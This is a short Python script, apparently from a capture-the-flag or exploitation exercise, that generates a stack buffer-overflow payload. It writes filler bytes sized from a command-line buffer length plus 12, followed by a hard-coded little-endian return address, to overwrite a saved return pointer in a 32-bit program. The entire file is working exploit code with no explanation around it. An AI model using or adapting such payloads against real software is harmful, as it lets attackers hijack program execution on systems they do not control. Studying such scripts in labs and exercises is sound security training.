#!/usr/bin/env python3
import sys

TARGET = b'\xfb\x8a\x04\x08' # little endian
_, buflen = sys.argv
junk = b'\xaf' * (int(buflen) + 12)
sys.stdout.buffer.write(junk)
sys.stdout.buffer.write(TARGET)
